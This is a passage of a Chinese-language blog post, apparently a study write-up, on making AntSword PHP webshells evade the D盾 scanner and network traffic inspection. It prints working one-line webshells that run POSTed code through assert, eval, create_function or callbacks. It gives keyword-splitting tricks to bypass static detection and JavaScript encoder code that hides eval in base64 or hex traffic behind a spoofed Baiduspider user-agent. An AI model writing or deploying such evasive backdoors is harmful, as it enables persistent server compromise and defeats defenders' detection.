dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">    $R &#x3D; &quot;&#123;$D&#125;	&quot;;</span><br><span class="line">    if (substr($D, 0, 1) !&#x3D; &quot;&#x2F;&quot;) &#123;</span><br><span class="line">        foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. &#x3D; &quot;&#123;$L&#125;:&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $R. &#x3D; &quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $R. &#x3D; &quot;	&quot;;</span><br><span class="line">    $u &#x3D; (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;;</span><br><span class="line">    $s &#x3D; ($u) ? $u[&quot;name&quot;] : @get_current_user();</span><br><span class="line">    $R. &#x3D; php_uname();</span><br><span class="line">    $R. &#x3D; &quot;	&#123;$s&#125;&quot;;</span><br><span class="line">    echo $R;;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e - &gt; getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>

<p>大致的意思会输出一些内容  随机字符串+环境变量+随机字符串，如果用eval代替assert是完全没问题的，我查了下资料，assert是不能执行多个语句的，eval可以，所以这里使用assert会有返回为空的问题。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114425121.png" alt="image-20200727114425121"></p>
<p>这个问题可以使用base64编码的问题解决，编码后的数据包如下，可以看到ant这个参数传入的是一句话，因此就可以通过assert执行成功。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114808620.png" alt="image-20200727114808620"></p>
<p>这里就是蚁剑使用assert的shell的一个坑，<strong>如果使用assert不要使用默认编码。</strong></p>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>这种方式是通过create_function创建匿名函数来执行命令的，shell的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;create_function(&quot;&quot;, base64_decode(&#39;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#39;));</span><br><span class="line">$ant();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="php-custom-script-for-mysql"><a href="#php-custom-script-for-mysql" class="headerlink" title="php_custom_script_for_mysql"></a>php_custom_script_for_mysql</h4><p>使用这种方式的shell，需要在连接类型上选择custom，否则会连接不上。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727131327779.png" alt="image-20200727131327779"></p>
<p>使用这种模式我们需要上传的代码是比较长的，大概13k左右。好处就是在数据包中没有明显的eval这样命令执行的名字出现，因为作者已经在custom的代码中进行了实现。比如我们要测试连接。我拿create_funcion和custom的数据包进行对比，内容如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132341964.png" alt="image-20200727132341964"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132412642.png" alt="image-20200727132412642"></p>
<p>为什么A就可以返回内容，我们大概分析下代码。</p>
<p>首先获取$pwd也就是我们的密码的参数值，调用EC字符串编解码的函数进行处理</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132702622.png" alt="image-20200727132702622"></p>
<p>根据pwd的值的不同调用不同的函数做对应的操作</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132825291.png" alt="image-20200727132825291"></p>
<p>我们在看下BaseInfo()函数具体执行的操作，这里的代码和我们使用其他模式发送的数据是一样的，就是获取服务端的基本信息进行输出，</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132906141.png" alt="image-20200727132906141"></p>
<p>custom模式我们大概了解了，再看下一个shell。</p>
<h4 id="php-eval-rsa-script"><a href="#php-eval-rsa-script" class="headerlink" title="php_eval_rsa_script"></a>php_eval_rsa_script</h4><p>使用这个shell的条件是需要开启openssl的，而且我测试php5.4.45没成功，在php5.3.29下是可以的。</p>
<p>在phpinfo中查看是否开启了openssl</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727143928992.png" alt="image-20200727143928992"></p>
<p>开启了openssl后，我们找到蚁剑的编码管理功能，有个rsa配置的功能。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144031550.png" alt="image-20200727144031550"></p>
<p>打开后内容如下，主要分为三个部分，RSA的公钥，私钥和php代码。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144108286.png" alt="image-20200727144108286"></p>
<p>我们将生成的php代码传到服务端，因为这里获取数据是通过公钥解密的，所以我们需要使用私钥对我们传递的数据进行加密，因此需要创建一个编码器。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144333763.png" alt="image-20200727144333763"></p>
<p>创建好编码器后，我们在连接的时候选择我们创建的rsa编码器即可</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144450235.png" alt="image-20200727144450235"></p>
<p>使用rsa加密后数据包的内容如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144526707.png" alt="image-20200727144526707"></p>
<h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><p>首先，抛开custom类型的shell，我们发现其他的shell本质上都是构造了一个命令执行的点，所以我们只要构建一个命令执行的点就可以了。</p>
<p>我这里以D盾来测试shell的静态免杀，我将蚁剑自带的assert那个马扔上去d盾会爆已知后门，然后我尝试将里面的关键字进行更改，已经无法造成一个命令执行的功能了，D盾还是会爆已知后门，也就是说D盾这里检测应该是进行了某些关键字的匹配的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150401374.png" alt="image-20200727150401374"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150414729.png" alt="image-20200727150414729"></p>
<p>我将第二行的内容删掉，D盾还是会爆二级，也就是说如果我们想要静态免杀完全过D盾，不能直接使用变量名做函数名这种方式。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150635040.png" alt="image-20200727150635040"></p>
<p>而且这里和是否接收参数也无关，都会爆的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150819212.png" alt="image-20200727150819212"></p>
<p>我发现D盾在这里进行拦截时是会去匹配括号是否闭合的，那我们就可以测试，当我假如复杂的括号时，能否绕过这个规则。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727155255367.png" alt="image-20200727155255367"></p>
<p>这样虽然可以达到绕过的目的，但是也不符合php的语法。所以我想将括号里的内容注释掉，不过加了注释后又会被拦截。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727162618952.png" alt="image-20200727162618952"></p>
<p>我尝试在这些括号的两边加上单双引号，也是无法绕过的，我看网上之前有人加了反引号进行绕过，可能是版本更新了吧，我通过那种方式无法绕过，好吧，我承认这个点我绕不过去了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果没有思路了，那就是自己的知识受限了，因此我去看了看其他人的文章</span><br></pre></td></tr></table></figure>

<p>有篇文章也是用了变量函数，但是并没有被拦截。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727170037503.png" alt="image-20200727170037503"></p>
<p>所以D盾的拦截可变变量的规则是在$xx()在行首的时候，然后我试了试使用上面那种方式的shell，这个仍然还可以免杀。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727171248076.png" alt="image-20200727171248076"></p>
<p>但是能不能免杀并不是我们的重点，因为是学习嘛，所以得知道为什么他就能免杀了。一方面是上面我分析的绕过了变量函数的检测，我再测试了下，当我们不使用可变变量的形式而是直接assert调用的话是会被拦的。所以就使用了两个技术</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.变量函数的检测绕过</span><br><span class="line">2.通过变量函数来将函数关键字和函数调用部分分开了，破坏了类似于assert()这样的拦截规则。</span><br></pre></td></tr></table></figure>

<p>这个是最主要的绕过的点，如果被其他的杀软拦截了，我们还可以进行各种变形。</p>
<p><strong>方法一：关键字拆分</strong></p>
<p>关于assert这个关键字的各种变形</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;a&#39;.&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;   &#x2F;&#x2F;拼接</span><br><span class="line">$a &#x3D; substr(&#39;1a&#39;,1).substr(&#39;1as&#39;,2).&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;; &#x2F;&#x2F;拼接+截取</span><br><span class="line">$a &#x3D; strtr(&#39;azxcvt&#39;,&#39;zxcv&#39;,&#39;sser&#39;);&#x2F;&#x2F;截取替换</span><br><span class="line">$a &#x3D; substr_replace(&quot;asxxx&quot;,&quot;sert&quot;,2); &#x2F;&#x2F;替换</span><br><span class="line">$a&#x3D;chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br></pre></td></tr></table></figure>

<p><strong>方法二：改变调用函数</strong></p>
<p>上面的shell我们是调用assert达到代码执行的目的，那么有没有那个函数可以替换assert这个函数呢。本来以为会有很多函数，查了下发现没有那种可以直接调用的，不过可以通过一些回调函数来解决。我以call_user_func为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;call_user_func&quot;;</span><br><span class="line">$c&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当然也可以拿其他函数进行变形绕过，这里只是给一个思路。</p>
<p><strong>方法三：改变array+var_dump</strong></p>
<p>通过前面的绕过，我们知道这种绕过Dd盾方法的核心在于可变函数的调用方式没有被检测出来，也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br></pre></td></tr></table></figure>

<p>那么我们在这部分要绕过的点就是有没有哪些调用方式可以放在可变函数的前面，我尝试写个自定义函数来进行绕过，但是使用这种方法不能绕过。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727214520026.png" alt="image-20200727214520026"></p>
<p>之前我们调用的是var_dump,也可以调用其他方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>还可以这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;&quot;assert&quot;;</span><br><span class="line">	$arr &#x3D; new ArrayObject(array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;])));</span><br><span class="line">	$arr-&gt;uksort();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>好了，关于静态免杀先学到这，其他的方式当然还有很多，我只是挑了一个点而已。</p>
<h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><p>上面的操作只是帮我们过了一个shell查杀工具的静态查杀，但是有时候会有这样的情况，就是shell传上去好好的，也没杀，只要一连接就被干掉了，这是为什么呢？这个就涉及到流量方面的免杀了。</p>
<h4 id="特征去除"><a href="#特征去除" class="headerlink" title="特征去除"></a>特征去除</h4><p>关于蚁剑这款工具，功能很强大，用起来也挺舒服，但是他出名啊，出名的话就会被很多厂商拿去分析，所以我们在使用蚁剑的时候需要去除我们使用蚁剑和服务端进行交互的流量特征，那么都有什么特征呢？</p>
<h5 id="特征一：user-agent"><a href="#特征一：user-agent" class="headerlink" title="特征一：user-agent"></a>特征一：user-agent</h5><p>​    这个特征是一个非常明显的特征，就和sqlmap的user-agent一样，都是和工具相关的，我们看下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090059610.png" alt="image-20200728090059610"></p>
<p>这个特征非常明显吧，所以我们使用蚁剑这个特征是一定要改的，我们找到/modules/request.js文件，有个USER_AGENT</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090412292.png" alt="image-20200728090412292"></p>
<p>我们将它改成百度的爬虫</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0;+http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)</span><br></pre></td></tr></table></figure>

<p>网上还有人说，需要更改/modules/update.js的请求头，但我看了下这个功能是和github进行交互的，不是和目标交互的流量，所以我认为可以不改吧。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090753980.png" alt="image-20200728090753980"></p>
<p>然后重启蚁剑，USER-AGENT内容就已经成功被修改了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091048839.png" alt="image-20200728091048839"></p>
<h5 id="特征二：变量规则"><a href="#特征二：变量规则" class="headerlink" title="特征二：变量规则"></a>特征二：变量规则</h5><p>首先来看下蚁剑的一个数据包，注意看下我圈出来的部分，这里面字符的长度是固定的，在变量那部分，长度是固定的14位，返回包部分前面是9位，后面是7位。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091745973.png" alt="image-20200728091745973"></p>
<p>我们新建一个编码器对发送的数据进行处理，编码器里面有个默认的实例，是base64的编码器，就是我们上面图中发送数据使用的编码器，我们学习下是怎么处理的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728092809554.png" alt="image-20200728092809554"></p>
<p>作者也非常贴心的把注释写的非常清楚，首先是生成一个14位长度的随机值当作参数名，然后把我们需要传递的内容base64编码进行赋值，然后在pwd中传入代码执行的代码。</p>
<p>首先看下变量长度的问题如何解决，可以通过随机生成一个长度字段，再去根据长度去随机生成相应的内容，这样就可以确保每次发起请求的参数长度是变化的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br></pre></td></tr></table></figure>

<p>这样我们发送的参数名的长度就是变化的了。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728102211355.png" alt="image-20200728102211355"></p>
<p>但是我们仍然有一个核心的问题没有解决，就是在我们发送的流量里面会有eval，这个如何解决呢？</p>
<h5 id="特征三：eval特征处理"><a href="#特征三：eval特征处理" class="headerlink" title="特征三：eval特征处理"></a>特征三：eval特征处理</h5><p>我参考了蚁剑作者关于这部分处理的文章，他是将eval这部分进行了编码，如果直接对eval进行编码，那在服务端是无法识别这个流量的，因此服务端也需要对这个数据进行base64解码，使用这种方法需要稍微改变一下服务端的代码。</p>
<p>首先修改一下编码器的代码，将eval部分的代码base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[pwd] &#x3D; Buffer.from(&#96;eval(base64_decode($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;base64&#39;);</span><br></pre></td></tr></table></figure>

<p>然后在修改下我们的shell，让其在接收参数的时候进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;base64_decode($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后再抓包看下流量，已经没有eval的特征了</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728104852973.png" alt="image-20200728104852973"></p>
<p>其实同理，我们既然可以base64,为什么不能hex呢？</p>
<p>这个我就不讲了，如果理解了base64，那么这个也非常容易</p>
<p><strong>编码器</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;07&#x2F;28 10:16:51</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; Buffer.from(&#96;eval(Hex2String($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>shell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function Hex2String($hex)&#123;</span><br><span class="line">    $string&#x3D;&#39;&#39;;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; strlen($hex)-1; $i+&#x3D;2)&#123;</span><br><span class="line">        $string .&#x3D; chr(hexdec($hex[$i].$hex[$i+1]));</span><br><span class="line">    &#125;</span><br><span class="line">    echo $string;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;Hex2String($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后效果如下;</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728105845603.png" alt="image-20200728105845603"></p>
<p>这种简单的编解码处理可能防护设备也会自己解码，我们可以使用各种加密，或者自己写一个简单的算法对数据进行处理，甚至使用多种编解码+加密方式混合处理。</p>
<h5 id="特征四：返回包格式"><a href="#特征四：返回包格式" class="headerlink" title="特征四：返回包格式"></a>特征四：返回包格式</h5><p>我这里查看了下蚁剑处理返回包的模板，发现其实蚁剑对返回包的分隔符的长度是随机生成的，代码在source/core/php/index.js中</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728111846522.png" alt="image-20200728111846522"></p>
<p>所以在返回包处理这部分，我们更应该关注的不是返回包格式的问题，而是返回的明文内容的问题，这些特征都是特别明显的。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112128155.png" alt="image-20200728112128155"></p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112144427.png" alt="image-20200728112144427"></p>
<p>这里蚁剑本身就提供了一些解码器使用，比如base64解码，只要我们在使用的时候选择解码器就行了，不用我们在shell里面添加解码功能。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134220904.png" alt="image-20200728134220904"></p>
<p>使用效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134243030.png" alt="image-20200728134243030"></p>
<p>我们再看下我们发送的数据是怎么样的，如下图所示，就是我们发送的数据包中让其在输出的时候做了一个base64的编码</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134401588.png" alt="image-20200728134401588"></p>
<p>同理，蚁剑还提供了rot13的解码器，使用效果如下：</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134524436.png" alt="image-20200728134524436"></p>
<h5 id="特征五：custom-shell的特性"><a href="#特征五：custom-shell的特性" class="headerlink" title="特征五：custom shell的特性"></a>特征五：custom shell的特性</h5><p>首先我们使用一个custom模式的shell，然后抓包看下返回包,有没有看到一个非常明显的特征。</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728152948041.png" alt="image-20200728152948041"></p>
<p>对的，如你所见，这个特征就是-&gt;|和|&lt;-，正常的数据包中基本不会出现这个，因此这个也会被当作是蚁剑的特征。因为这边我们只传入了一个A，因此返回的处理逻辑肯定是写在custom的shell里的，我在shell中找到了对应的代码，但是直接删除后发现蚁剑不能正常工作了，也就是如果要删除这个东西会影响蚁剑对返回包的解析，因此可能需要修改蚁剑处理custom模式返回包部分的代码。在蚁剑的source/core/custom/index.js中，我找到了对应的代码位置。</p>
